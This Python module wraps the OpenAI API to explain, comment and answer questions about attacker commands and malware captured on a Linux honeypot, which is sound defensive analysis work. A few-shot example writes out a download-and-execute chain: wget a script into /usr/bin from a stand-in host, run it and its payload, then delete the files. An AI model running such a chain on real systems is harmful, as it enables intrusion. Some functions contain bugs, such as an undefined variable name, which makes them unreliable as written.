from analyzerbase import *

import ast
from openai import OpenAI, OpenAIError
OPENAI_API_KEY = os.environ.get('OPENAI_API_KEY')

class OpenAIAnalyzer:
    
    def __init__(self, training_data_dir=Path("openai-training-data"), aidb_path=Path("tests/aidb"), api_key=OPENAI_API_KEY, model="gpt-4-1106-preview") -> None:

        
        self.training_data_dir = Path(training_data_dir)
        if not self.training_data_dir.exists():
            self.training_data_dir.mkdir(exist_ok=True, parents=True)
        
        self.aidb_path = Path(aidb_path)
        if not self.aidb_path.exists():
            self.aidb_path.mkdir(exist_ok=True, parents=True)

        self.client = OpenAI(api_key=OPENAI_API_KEY)
        self.model = model

        



    def write_training_data(self, filename, data):
        file = (self.training_data_dir / filename)
        if not file.parent.exists():
            file.parent.mkdir(exist_ok=True, parents=True)
        
        if isinstance(data, list):
            data = "\n".join(data)
        
        if isinstance(data, dict):
            if all(isinstance(k, str) and isinstance(v, str) for k,v in data.items()):
                data = "\n".join([f"{k}\n{v}\n" for k,v in data.items()])
            else:
                data = json.dumps(data, indent=4)
            
        with file.open("w+") as f:
            f.write(data)

       
    def read_training_data(self, filename, returnas=None):
        file = self.training_data_dir / filename
        # if not file.exists():
        #     return None
        
        with file.open("r") as f:
            
            if returnas in ("list", list):
                return [line.rstrip("\n") for line in f]
            
            elif returnas in ("dict", dict):
                return {k:v for k,v in zip(f.readlines()[::2], f.readlines()[1::2])}
            
            elif returnas in ("json", json):
                return json.load(f)
            
            elif returnas in ("split_firstline", "mw"):
                lines = f.readlines()
                firstline = lines[0].rstrip("\n")
                data = "".join(lines[1:])

                return firstline, data
        
            else:
                return f.read()





    def _try_openai(self, getter_fn, parser_fn, **kwargs):
        try:
            response = getter_fn(**kwargs)
            return parser_fn(response)
        except Exception as e:
            if isinstance(e, (OpenAIError)):
                print(e)
                return f'OpenAI Error: {e}'
            else:
                print(e)
                return str(e)    


    

    def openai_get_completion(self, messages=[], n=1, **kwargs):
        message_hash = sha256hex(str(messages))
        db_file = self.aidb_path / f"{message_hash}.json"
        
        if db_file.exists():
            print(f"Reading {message_hash} from db")
            with open(db_file) as f:
                result = json.load(f)["result"]
        else:
            print(f"Getting OpenAI resp for message_hash {message_hash}")
            result = self._try_openai(
                getter_fn=self.client.chat.completions.create, 
                parser_fn=lambda response: response.choices[0].message.content.strip(),
                messages=messages, 
                n=n,
                **kwargs)

            with open(db_file, "w+") as f:
                json.dump({"messages": messages, "kwargs": kwargs, "result": result}, f, indent=2)

        return result
    


    def _try_load_json_result(self, result):
        try:
            return json.loads(result)
        except Exception as e1:
            try:
                return ast.literal_eval(result)
            except Exception as e2:
                return {"error_json_loads": e1, 
                        "error_ast_literal_eval": e2, 
                        "result": result}


    def get_json_response(self, messages=[], n=1, retries=0, **kwargs):
        result = self.openai_get_completion(
            model=self.model,
            messages=messages,
            n=n,
            response_format={ "type": "json_object" },
            **kwargs)
        
        result = self._try_load_json_result(result)

        if result.get("error_ast_literal_eval") and retries > 0:
            return self.get_json_response(messages, n=n, retries=retries - 1, **kwargs)

        return result


    def make_few_shot_prompt(self, system_prompt, examples, user_input):
       
        # Join system_prompt if it is a list or tuple
        if not isinstance(system_prompt, str):
            system_prompt = " ".join(system_prompt)

        # JSON encode user_input if it is not a string
        user_input = self.format_content(user_input)
    
        # Create list of messages beginning with system_prompt
        messages = []
        messages.append({"role": "system", "content": system_prompt})

        # Add examples to messages
        for example in examples:
            example_input = self.format_content(example['input'])
            example_response = self.format_content(example['response'])
            
            messages.append({"role": "user", "content": example_input})
            messages.append({"role": "assistant", "content": example_response})

        # Add user_input to messages
        messages.append({"role": "user", "content": user_input})

        return messages
    
    

    def format_content(self, content):
        if not isinstance(content, str):
            content = json.dumps(content, indent=0)
        
        return content
            

    def format_commands(self, commands):
        #return json.dumps({ str(n) : cmd for n, cmd in enumerate(commands)}, indent=0 )
        return { str(n) : cmd for n, cmd in enumerate(commands) }
    





    def explain_commands(self, commands=[], n=1, retries=0, **kwargs):
        system_prompt = [
        "Your role is to throughly explain a series commands that were executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object in the following format: {command_index: command_string, ...}.",
        "Output must be a json object with string keys that correspond to command indicies or command ranges, and string values that explain the corresponding command(s).",
        "Output must be in the following format {command_index: explanation_string, ...}."
        "The explanation_string values will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        "You should group adjcent commands into logical groups and explain what the attacker was trying to do with each command.",
        ]

        
        example_commands1 = ["wget http://example.com -O /usr/bin/example.sh", 
                             "cd /usr/bin;chmod +x example.sh", 
                             "./example.sh >> example_output.py", 
                             "exec example_output.py || python3 example_output.py &",
                             "ps -ajfx | grep example_output.py", 
                             "rm example.sh",  "rm example_output.py", "exit"]
        
        example_response1 = {
            "0":"The attacker uses `wget` to **download a shell script** from `http://example.com` saving it as `/usr/bin/example.sh`",
            "1":"The attacker then **changes directories** to `/usr/bin` and makes the script **executable** with `chmod +x example.sh`",
            "2":"The attacker then executes the script with `./example.sh` and **appends the output of the shell script to a new python file named `example_output.py`**",
            "3":"The attacker then **executes the generated python script** `example_output.py` through the `exec` command or in the background`python3 example_output.py &`",
            "4":"The attacker then **lists all processes** and **filters the output** for `example_output.py` with `ps -ajfx | grep example_output.py`",
            "5-6":"The attacker then **removes the shell script** `example.sh` and the python script `example_output.py` with `rm example.sh` and `rm example_output.py`",
            "7":"Finally, the attacker **exits the terminal** with `exit`",
        }


        example_commands1 = self.read_training_data("explain_commands/example_commands1.sh", returnas=list)
        example_commands1 = self.format_commands(example_commands1)
        example_response1 = self.read_training_data("explain_commands/example_response1.json", returnas="json")


        examples = [{"input": example_commands1, "response": example_response1}]
        # TODO add more examples

        messages = self.make_few_shot_prompt(
            system_prompt, examples, 
            user_input=self.format_commands(commands))
        
        result = self.get_json_response(messages, n=n, retries=retries, **kwargs)

        return self.zip_command_explanations(commands, result)




    def zip_command_explanations(self, commands, result):
        if isinstance(result, list):
            if len(result) == len(commands):
                return dict(zip(commands, result))
            else:
                return dict(zip(commands, result + [""] * (len(commands) - len(result))))
        
        if isinstance(result, dict):
            keys = list(result.keys())

            if len(keys) == len(commands):
                result = [k + v for k,v in result.items()]
                return dict(zip(commands, result))
            
            if all([isinstance(k, int) for k in keys]):  
                return {commands[i]: result.get(i) for i in range(len(commands))}
            
            valid_range_keys = re.compile(r"(\d+)\-?(\d*)")
            key_matches = { k : valid_range_keys.match(k) for k in keys }
            
            if all(key_matches):
                grouped_commands = []
                for k in keys:
                    start, end = key_matches[k].groups()
                    if end == "":
                        i = int(start)
                        grouped_commands.append(commands[i])
                    else:
                        start, end = int(start), int(end)
                        grouped_commands.append("\n".join(commands[start:end]))
                

                return dict(zip(grouped_commands, result.values()))

            elif all([isinstance(k, str) for k in keys]):
                return dict(zip(commands, result.values()))







    def explain_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to throughly explain a piece of malware that was executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object with two keys: malware_source_code and commands.",
        "Input will be structured in the following format: {malware_source_code: malware_source_code_string, commands: {command_index: command_string, ...}}."
        "malware_source_code will be a string containing the source code of the malware that you are to explain.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "Output must be a json object with two keys: malware_explanation, malware_language",
        "Output must be in the following format {malware_explanation: paragraph(s) explaining the malware, malware_language: language_malware_is_written_in}.",
        "The malware_explanation should explain the malware source code in detail and what the attacker was trying to do with the malware.",
        "The malware_explanation value will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        ])




        example_malware1 = self.read_training_data("shared/example_malware1.py")
        example_commands1 = self.read_training_data("shared/example_commands1.sh", returnas=list)
        example_explanation1 = self.read_training_data("shared/example_explanation.txt")



        example_input1 = {"malware_source_code": example_malware1, "commands": self.format_commands(example_commands1)}
        example_response1 = {"malware_explanation": example_explanation1, "malware_language": "python"}

        examples = [{"input": example_input1, "response": example_response1}]
        messages = self.make_few_shot_prompt(
            system_prompt, examples, 
            user_input={
                "malware_source_code": malware_source_code, 
                "commands": self.format_commands(commands)
                })
        
        result = self.get_json_response(messages, n=n, retries=retries, **kwargs)
        return result

    

    def comment_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to add detailed comments to a piece of malware that was executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object with two keys: malware_source_code and commands.",
        "Input will be structured in the following format: "
        "{malware_source_code: {line_number_in_source_code: malware_source_code_line_string, commands: {command_index: command_string, ...}}."
        "malware_source_code will be a json object containing each line of the source code of the malware that you are to add comments to.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "Output must be a json object with keys that correspond to line numbers in the malware_source_code and values that are the comments for that line.",
        "Comments should explain what the attacker was trying to do with each important line of the malware_source_code.",
        "Comments will be inserted in the malware source code so make sure to use the correct syntax for the language the malware is written in and indent your comments correctly.",
        ])

        example_commands = self.read_training_data("shared/example_commands1.sh", returnas=list)
        example_malware = self.read_training_data("shared/example_malware1.py")
        lanugage, commented_malware = self.read_training_data("shared/commented_malware1.py", returnas="split_firstline")
        lanugage = lanugage.split(":")[1].strip()


        
        
        #example_response = commented_malware
        example_response = {}
        commented_malware_lines = commented_malware.split("\n")
        example_malware_lines = example_malware.split("\n")

        example_malware_lines_input = { str(n+1) : line for n, line in enumerate(example_malware_lines)}
        example_input = {"malware_source_code": example_malware_lines_input, "commands": self.format_commands(example_commands)}
        

        comment = ""
        for line in commented_malware_lines:
            if line.strip().startswith("#"):
                comment += line + "\n"
            elif comment:
                example_malware_lines_index = example_malware_lines.index(line)
                example_response[example_malware_lines_index+1] = comment
                comment = ""

        examples = [{"input": example_input, "response": example_response}]
        messages = self.make_few_shot_prompt(
            system_prompt, examples,
            user_input={
                "malware_source_code": malware_source_code, 
                "commands": self.format_commands(commands)
                })
        
        result = self.get_json_response(messages, n=n, retries=retries, **kwargs)
        return self.insert_comments(malware_source_code, result)

    

    def insert_comments(self, source_code, comment_indexes):
        lines = source_code.split("\n")
        for line_index, comment in comment_indexes.items():
            line_index = int(line_index)
            lines[line_index] = comment + "\n" + lines[line_index]

        return "\n".join(lines)





    def explain_and_comment_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to throughly explain and comment a piece of malware that was executed by an attacker on a Linux honeypot system.",
        "Input will be provided as a json object with two keys: malware_source_code and commands.",
        "Input will be structured in the following format: "
        "{malware_source_code: malware_source_code_string, commands: {command_index: command_string, ...}}."
        "malware_source_code will be a string containing the source code of the malware that you are to explain and comment.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "Output must be a json object with three keys: commented_code, malware_explanation, malware_language",
        "Output must be in the following format "
        "{commented_code: malware_source_code_with_comments_explaining_steps, malware_explanation: paragraph(s) explaining the malware, malware_language: language_malware_is_written_in}."
        "The commented_code value must contain every line of the input source code but with comments explaining each step of the malware execution.",
        "The malware_explanation should explain the code and comments in the commented_code value in greater detail and what the attacker was trying to do with the malware.",
        "The malware_explanation value will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        ])




        
        example_commands1 = self.read_training_data("shared/example_commands1.sh", returnas=list)
        example_malware1 = self.read_training_data("shared/example_malware1.py")
        example_explanation1 = self.read_training_data("shared/example_explanation1.md")
        
        
        lanugage, commented_malware1 = self.read_training_data("shared/commented_malware1.py", returnas="split_firstline")
        lanugage = lanugage.split(":")[1].strip()

        example_input1 = {"malware_source_code": example_malware1, "commands": self.format_commands(example_commands1)}
        example_response1 = {"commented_code": commented_malware1, "malware_explanation": example_explanation1, "malware_language": language}

        examples = [{"input": example_input1, "response": example_response1}]
        messages = self.make_few_shot_prompt(
            system_prompt, examples, 
            user_input={
                "malware_source_code": malware_source_code, 
                "commands": self.format_commands(commands)
                })
        
        result = self.get_json_response(messages, n=n, retries=retries, **kwargs)
        return result





    def answer_attack_questions(self, questions: list, commands=[], malware_source_code=None, n=1, retries=0, **kwargs):
        system_prompt = " ".join([
        "Your role is to answer questions about an that was recorded on a Linux honeypot system.",
        "Input will be provided as a json object with three keys: commands and malware_source_code.",
        "Input will be structured in the following format: {questions: {question_index: question_string, ...}, commands: {command_index: command_string, ...}, malware_source_code: malware_source_code_string}.",
        "questions are the questions that you are to answer about the attack.",
        "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
        "malware_source_code is the source code of the malware that was executed by the attacker and can be an empty string if no malware was downloaded or executed by the attacker.",
        "Output must be a json object with one key per question and values that are the answers to the questions with the corresponding question_index.",
        "Output must be in the following format {answer_index: paragraph(s) explaining answer to question at question_index, ...}.",
        "The answer values will be used in a GitHub .md file so you can use markdown syntax to format your output.",
        ])



        q1, a1 = self.read_training_data("answer_attack_questions/example_questions1.md", returnas="split_firstline")
        
        example_malware1 = self.read_training_data("shared/example_malware1.py")
        example_commands1 = self.read_training_data("shared/example_commands1.sh", returnas=list)

        example_input1 = {"questions": self.format_commands([q1]), 
                          "malware_source_code": example_malware1, 
                          "commands": self.format_commands(example_commands1)
                          }
        example_response1 = self.format_commands([a1])

        examples = [{"input": example_input1, "response": example_response1}]        

        messages = self.make_few_shot_prompt(
            system_prompt, examples, 
            user_input={
                "questions": self.format_commands(questions), 
                "commands": self.format_commands(commands),
                "malware_source_code": malware_source_code
                })

        result = self.get_json_response(messages, n=n, retries=retries, **kwargs)

        return self.zip_question_answers(questions, result)
        
        
    def zip_question_answers(self,questions,result):
        return dict(zip(questions, result.values()))



    

if __name__ == "__main__":
    pass


























